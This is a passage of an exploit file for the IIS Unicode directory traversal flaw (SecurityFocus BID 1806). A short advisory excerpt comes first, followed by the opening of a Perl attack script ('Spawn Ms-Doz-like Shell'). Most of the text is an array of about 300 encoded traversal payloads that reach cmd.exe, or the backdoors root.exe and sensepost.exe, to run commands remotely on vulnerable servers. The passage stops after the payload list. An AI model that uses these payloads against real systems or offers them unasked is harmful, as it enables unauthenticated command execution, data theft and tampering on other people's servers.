@@ -1,0 +1,691 @@
+source: http://www.securityfocus.com/bid/1806/info
+  
+Microsoft IIS 4.0 and 5.0 are both vulnerable to double dot "../" directory traversal exploitation if extended UNICODE character representations are used in substitution for "/" and "\".
+  
+Unauthenticated users may access any known file in the context of the IUSR_machinename account. The IUSR_machinename account is a member of the Everyone and Users groups by default, therefore, any file on the same logical drive as any web-accessible file that is accessible to these groups can be deleted, modified, or executed. Successful exploitation would yield the same privileges as a user who could successfully log onto the system to a remote user possessing no credentials whatsoever.
+  
+It has been discovered that a Windows 98 host running Microsoft Personal Web Server is also subject to this vulnerability. (March 18, 2001)
+  
+This is the vulnerability exploited by the Code Blue Worm.
+  
+**UPDATE**: It is believed that an aggressive worm may be in the wild that actively exploits this vulnerability.
+
+##########################################################
+# Spawn Ms-Doz-like Shell on MicrosoZ IIS
+# on IIS vulnerable servers using 450 ways
+# (like Unicode, Codered, corrupt string and Backdoor)
+#     NOW SUPPORT ALL UNIX SYSTEM !
+# Use port number with SSLproxy for testing SSL sites
+# Andrea Spabam 2001 GPL2 or highter
+# spabam@go.to
+# This Script is currently under development
+# link to http://spabam.da.ru to get latest version
+##########################################################
+use strict;
+use IO::Socket;
+my $host;
+my $port;
+my $command;
+my $url;
+my @results;
+my $probe;
+my @U;
+$U[1] = "/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[2] = "/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";
+$U[3] = "/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[4] = "/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[5] = "..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[6] = "/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[7] = "/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[8] = "/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[9] = "/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";
+$U[10] = "/..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[11] = "/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+";
+$U[12] = "/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+";
+$U[13] = "/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+";
+$U[14] = "/..%c0%af..%c0%af..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+";
+$U[15] = "/..%c1%1c..%c1%1c..%c1%1c..%Cc1%1cwinnt/system32/cmd.exe?/c+";
+$U[16] = "/..%c1%9c..%c1%9c..%c1%9c..%c1%9cwinnt/system32/cmd.exe?/c+";
+$U[17] = "/..%c0%9v../winnt/system32/cmd.exe?/c+";
+$U[18] = "/..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[19] = "/..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[20] = "/..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[21] = "/..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[22] = "/..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[23] = "/..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[24] = "/..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[25] = "/..%e0%80%af../winnt/system32/cmd.exe?/c+";
+$U[26] = "/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[27] = "/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[28] = "/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[29] = "/root.exe?/c+";
+$U[30] = "/cmd.exe?/c+";
+$U[31] = "/sensepost.exe?/c+";
+$U[32] = "/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[33] = "/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[34] = "/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[35] = "/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[36] = "/MSADC/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[37] = "/MSADC/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";
+$U[38] = "/MSADC/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[39] = "/MSADC/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[40] = "/MSADC..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[41] = "/MSADC/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[42] = "/MSADC/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[43] = "/MSADC/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[44] = "/MSADC/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";
+$U[45] = "/MSADC/..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[46] = "/MSADC/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+";
+$U[47] = "/MSADC/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+";
+$U[48] = "/MSADC/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+";
+$U[49] = "/MSADC/..%c0%af..%c0%af..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+";
+$U[50] = "/MSADC/..%c1%1c..%c1%1c..%c1%1c..%Cc1%1cwinnt/system32/cmd.exe?/c+";
+$U[51] = "/MSADC/..%c1%9c..%c1%9c..%c1%9c..%c1%9cwinnt/system32/cmd.exe?/c+";
+$U[52] = "/MSADC/..%c0%9v../winnt/system32/cmd.exe?/c+";
+$U[53] = "/MSADC/..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[54] = "/MSADC/..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[55] = "/MSADC/..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[56] = "/MSADC/..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[57] = "/MSADC/..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[58] = "/MSADC/..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[59] = "/MSADC/..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[60] = "/MSADC/..%e0%80%af../winnt/system32/cmd.exe?/c+";
+$U[61] = "/MSADC/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[62] = "/MSADC/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[63] = "/MSADC/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[64] = "/MSADC/root.exe?/c+";
+$U[65] = "/MSADC/cmd.exe?/c+";
+$U[66] = "/MSADC/sensepost.exe?/c+";
+$U[67] = "/MSADC/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[68] = "/MSADC/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[69] = "/MSADC/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[70] = "/MSADC/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[71] = "/msadc/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[72] = "/msadc/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";
+$U[73] = "/msadc/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[74] = "/msadc/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[75] = "/msadc..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[76] = "/msadc/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[77] = "/msadc/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[78] = "/msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[79] = "/msadc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";
+$U[80] = "/msadc/..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[81] = "/msadc/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+";
+$U[82] = "/msadc/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+";
+$U[83] = "/msadc/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+";
+$U[84] = "/msadc/..%c0%af..%c0%af..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+";
+$U[85] = "/msadc/..%c1%1c..%c1%1c..%c1%1c..%Cc1%1cwinnt/system32/cmd.exe?/c+";
+$U[86] = "/msadc/..%c1%9c..%c1%9c..%c1%9c..%c1%9cwinnt/system32/cmd.exe?/c+";
+$U[87] = "/msadc/..%c0%9v../winnt/system32/cmd.exe?/c+";
+$U[88] = "/msadc/..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[89] = "/msadc/..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[90] = "/msadc/..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[91] = "/msadc/..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[92] = "/msadc/..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[93] = "/msadc/..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[94] = "/msadc/..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[95] = "/msadc/..%e0%80%af../winnt/system32/cmd.exe?/c+";
+$U[96] = "/msadc/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[97] = "/msadc/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[98] = "/msadc/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[99] = "/msadc/root.exe?/c+";
+$U[100] = "/msadc/cmd.exe?/c+";
+$U[101] = "/msadc/sensepost.exe?/c+";
+$U[102] = "/msadc/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[103] = "/msadc/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[104] = "/msadc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[105] = "/msadc/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[106] = "/scripts/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[107] = "/scripts/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";
+$U[108] = "/scripts/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[109] = "/scripts/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[110] = "/scripts..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[111] = "/scripts/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[112] = "/scripts/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[113] = "/scripts/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[114] = "/scripts/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";
+$U[115] = "/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[116] = "/scripts/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+";
+$U[117] = "/scripts/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+";
+$U[118] = "/scripts/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+";
+$U[119] = "/scripts/..%c0%af..%c0%af..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+";
+$U[120] = "/scripts/..%c1%1c..%c1%1c..%c1%1c..%Cc1%1cwinnt/system32/cmd.exe?/c+";
+$U[121] = "/scripts/..%c1%9c..%c1%9c..%c1%9c..%c1%9cwinnt/system32/cmd.exe?/c+";
+$U[122] = "/scripts/..%c0%9v../winnt/system32/cmd.exe?/c+";
+$U[123] = "/scripts/..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[124] = "/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[125] = "/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[126] = "/scripts/..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[127] = "/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[128] = "/scripts/..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[129] = "/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[130] = "/scripts/..%e0%80%af../winnt/system32/cmd.exe?/c+";
+$U[131] = "/scripts/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[132] = "/scripts/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[133] = "/scripts/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[134] = "/scripts/root.exe?/c+";
+$U[135] = "/scripts/cmd.exe?/c+";
+$U[136] = "/scripts/sensepost.exe?/c+";
+$U[137] = "/scripts/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[138] = "/scripts/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[139] = "/scripts/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[140] = "/scripts/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[141] = "/PBServer/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[142] = "/PBServer/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";
+$U[143] = "/PBServer/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[144] = "/PBServer/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[145] = "/PBServer..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[146] = "/PBServer/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[147] = "/PBServer/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[148] = "/PBServer/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[149] = "/PBServer/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";
+$U[150] = "/PBServer/..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[151] = "/PBServer/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+";
+$U[152] = "/PBServer/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+";
+$U[153] = "/PBServer/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+";
+$U[154] = "/PBServer/..%c0%af..%c0%af..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+";
+$U[155] = "/PBServer/..%c1%1c..%c1%1c..%c1%1c..%Cc1%1cwinnt/system32/cmd.exe?/c+";
+$U[156] = "/PBServer/..%c1%9c..%c1%9c..%c1%9c..%c1%9cwinnt/system32/cmd.exe?/c+";
+$U[157] = "/PBServer/..%c0%9v../winnt/system32/cmd.exe?/c+";
+$U[158] = "/PBServer/..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[159] = "/PBServer/..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[160] = "/PBServer/..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[161] = "/PBServer/..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[162] = "/PBServer/..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[163] = "/PBServer/..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[164] = "/PBServer/..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[165] = "/PBServer/..%e0%80%af../winnt/system32/cmd.exe?/c+";
+$U[166] = "/PBServer/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[167] = "/PBServer/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[168] = "/PBServer/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[169] = "/PBServer/root.exe?/c+";
+$U[170] = "/PBServer/cmd.exe?/c+";
+$U[171] = "/PBServer/sensepost.exe?/c+";
+$U[172] = "/PBServer/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[173] = "/PBServer/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[174] = "/PBServer/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[175] = "/PBServer/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[176] = "/Rpc/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[177] = "/Rpc/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";
+$U[178] = "/Rpc/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[179] = "/Rpc/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[180] = "/Rpc..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[181] = "/Rpc/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[182] = "/Rpc/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[183] = "/Rpc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[184] = "/Rpc/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";
+$U[185] = "/Rpc/..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[186] = "/Rpc/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+";
+$U[187] = "/Rpc/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+";
+$U[188] = "/Rpc/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+";
+$U[189] = "/Rpc/..%c0%af..%c0%af..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+";
+$U[190] = "/Rpc/..%c1%1c..%c1%1c..%c1%1c..%Cc1%1cwinnt/system32/cmd.exe?/c+";
+$U[191] = "/Rpc/..%c1%9c..%c1%9c..%c1%9c..%c1%9cwinnt/system32/cmd.exe?/c+";
+$U[192] = "/Rpc/..%c0%9v../winnt/system32/cmd.exe?/c+";
+$U[193] = "/Rpc/..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[194] = "/Rpc/..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[195] = "/Rpc/..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[196] = "/Rpc/..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[197] = "/Rpc/..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[198] = "/Rpc/..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[199] = "/Rpc/..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[200] = "/Rpc/..%e0%80%af../winnt/system32/cmd.exe?/c+";
+$U[201] = "/Rpc/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[202] = "/Rpc/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[203] = "/Rpc/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[204] = "/Rpc/root.exe?/c+";
+$U[205] = "/Rpc/cmd.exe?/c+";
+$U[206] = "/Rpc/sensepost.exe?/c+";
+$U[207] = "/Rpc/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[208] = "/Rpc/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[209] = "/Rpc/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[210] = "/Rpc/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[211] = "/samples/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[212] = "/samples/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";
+$U[213] = "/samples/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[214] = "/samples/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[215] = "/samples..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[216] = "/samples/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[217] = "/samples/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[218] = "/samples/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[219] = "/samples/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";
+$U[220] = "/samples/..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[221] = "/samples/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+";
+$U[222] = "/samples/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+";
+$U[223] = "/samples/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+";
+$U[224] = "/samples/..%c0%af..%c0%af..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+";
+$U[225] = "/samples/..%c1%1c..%c1%1c..%c1%1c..%Cc1%1cwinnt/system32/cmd.exe?/c+";
+$U[226] = "/samples/..%c1%9c..%c1%9c..%c1%9c..%c1%9cwinnt/system32/cmd.exe?/c+";
+$U[227] = "/samples/..%c0%9v../winnt/system32/cmd.exe?/c+";
+$U[228] = "/samples/..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[229] = "/samples/..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[230] = "/samples/..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[231] = "/samples/..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[232] = "/samples/..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[233] = "/samples/..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[234] = "/samples/..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[235] = "/samples/..%e0%80%af../winnt/system32/cmd.exe?/c+";
+$U[236] = "/samples/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[237] = "/samples/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[238] = "/samples/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[239] = "/samples/root.exe?/c+";
+$U[240] = "/samples/cmd.exe?/c+";
+$U[241] = "/samples/sensepost.exe?/c+";
+$U[242] = "/samples/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[243] = "/samples/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[244] = "/samples/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[245] = "/samples/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[246] = "/_vti_bin/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[247] = "/_vti_bin/..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[248] = "/_vti_bin/..%%35c..%%35c..%%35c..%%35c..%%35c../winnt/system32/cmd.exe?/c+";
+$U[249] = "/_vti_bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[250] = "/_vti_bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[251] = "/_vti_bin/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+";
+$U[252] = "/_vti_bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[253] = "/_vti_bin/..%c0%af../..%c0%1f../..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[254] = "/_vti_bin/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[255] = "/_vti_cnf/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[256] = "/_vti_cnf/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[257] = "/adsamples/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[258] = "/adsamples/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[259] = "/cgi-bin/..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+";
+$U[260] = "/cgi-bin/..%%35c../..%%35c../..%%35c../winnt/system32/cmd.exe?/c+";
+$U[261] = "/cgi-bin/..%25%35%63..%25%35%63..%25%35%63..%25%35%63winnt/system32/cmd.exe?/c+";
+$U[262] = "/cgi-bin/..%25%35%63../..%25%35%63../..%25%35%63../winnt/system32/cmd.exe?/c+";
+$U[263] = "/cgi-bin..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[264] = "/cgi-bin/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[265] = "/cgi-bin/..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[266] = "/cgi-bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[267] = "/cgi-bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+";
+$U[268] = "/cgi-bin/..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[269] = "/cgi-bin/..%C0%AF..%C0%AF..%C0%AF..%C0%AFwinnt/system32/cmd.exe?/c+";
+$U[270] = "/cgi-bin/..%C1%1C..%C1%1C..%C1%1C..%C1%1Cwinnt/system32/cmd.exe?/c+";
+$U[271] = "/cgi-bin/..%C1%9C..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c+";
+$U[272] = "/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+";
+$U[273] = "/cgi-bin/..%c1%1c..%c1%1c..%c1%1c..%Cc1%1cwinnt/system32/cmd.exe?/c+";
+$U[274] = "/cgi-bin/..%c1%9c..%c1%9c..%c1%9c..%c1%9cwinnt/system32/cmd.exe?/c+";
+$U[275] = "/cgi-bin/..%c0%9v../winnt/system32/cmd.exe?/c+";
+$U[276] = "/cgi-bin/..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[277] = "/cgi-bin/..%c0%qf../winnt/system32/cmd.exe?/c+";
+$U[278] = "/cgi-bin/..%c1%1c../winnt/system32/cmd.exe?/c+";
+$U[279] = "/cgi-bin/..%c1%8s../winnt/system32/cmd.exe?/c+";
+$U[280] = "/cgi-bin/..%c1%9c../winnt/system32/cmd.exe?/c+";
+$U[281] = "/cgi-bin/..%c1%af../winnt/system32/cmd.exe?/c+";
+$U[282] = "/cgi-bin/..%c1%pc../winnt/system32/cmd.exe?/c+";
+$U[283] = "/cgi-bin/..%e0%80%af../winnt/system32/cmd.exe?/c+";
+$U[284] = "/cgi-bin/..%f0%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[285] = "/cgi-bin/..%f8%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[286] = "/cgi-bin/..%fc%80%80%80%80%af../winnt/system32/cmd.exe?/c+";
+$U[287] = "/cgi-bin/root.exe?/c+";
+$U[288] = "/cgi-bin/cmd.exe?/c+";
+$U[289] = "/cgi-bin/sensepost.exe?/c+";
+$U[290] = "/cgi-bin/..%%35%63..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
+$U[291] = "/cgi-bin/..%%35c..%%35c..%%35c..%%35cwinnt/system32/cmd.exe?/c+";
+$U[292] = "/cgi-bin/..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[293] = "/cgi-bin/.%252e/.%252e/.%252e/.%252e/winnt/system32/cmd.exe?/c+";
+$U[294] = "/cgi-bin/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[295] = "/cgi-bin/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[296] = "/iisadmpwd/..%252f..%252f..%252f..%252f..%252f..%252fwinnt/system32/cmd.exe?/c+";
+$U[297] = "/iisadmpwd/..%255c..%255c..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[298] = "/iisadmpwd/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[299] = "/iisadmpwd/..%c0%af../..%c0%af../..%c0%af../winnt/system32/cmd.exe?/c+";
+$U[300] = "/includes/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+";
+$U[301] = "/msadc/..%%35%63..%%35%63..%%35%63winnt/system32/cmd.exe?/c+";
